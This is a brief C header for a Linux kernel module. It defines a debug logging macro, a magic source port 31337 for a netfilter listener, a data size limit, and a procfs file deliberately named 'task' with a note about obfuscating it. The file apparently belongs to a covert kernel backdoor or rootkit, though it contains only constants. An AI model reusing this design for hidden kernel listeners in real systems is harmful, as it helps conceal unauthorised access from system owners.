
#include <linux/kernel.h>
#include <linux/stat.h>

#ifdef DEBUG
    #define KERNEL_LOG(...) printk(KERN_DEBUG __VA_ARGS__)
#else
    #define KERNEL_LOG(...)
#endif

#define MAGIC_SRC_PORT 31337  // magic numbers for netfilter listener
#define MAX_DATA_SIZE 64000  // a bit smaller than the maximum TCP/UDP payload sizes

#define PROCFS_FILENAME "task"  // TODO: obfuscate?
#define PROCFS_PERMISSIONS (S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH)